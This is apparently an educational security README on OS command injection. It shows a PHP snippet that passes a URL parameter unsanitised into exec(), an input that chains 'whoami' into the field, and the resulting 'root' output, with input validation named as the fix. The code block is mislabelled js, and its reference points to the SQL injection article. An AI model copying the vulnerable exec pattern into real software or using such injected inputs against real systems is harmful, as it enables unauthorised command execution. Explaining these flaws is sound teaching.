<p align="center"> <img src="https://raw.githubusercontent.com/qeeqbox/os-command-injection/main/os-command-injection.png"></p>

A threat actor may inject arbitrary operating system (OS) commands on target

## Example #1
1. Threat actor crafts a malicious request to a vulnerable target
2. The target process the malicious request and returns the result

## Code
#### Target-Logic 
```js
...
<?php
$result = exec("ping -c4 ".$_GET["ip"]);
echo($result)
?>
...
```

#### Target-In
```
x 2>/dev/null || whoami
```

#### Target-Out
```
root

```

## Impact
High

## Names
- Command Injection

## Risk
- Read & write data
- Command execution

## Redemption
- Input validation

## ID
154d5db5-9614-42f9-9898-3355a7b7848f

## References
- [wiki](https://en.wikipedia.org/wiki/sql_injection)
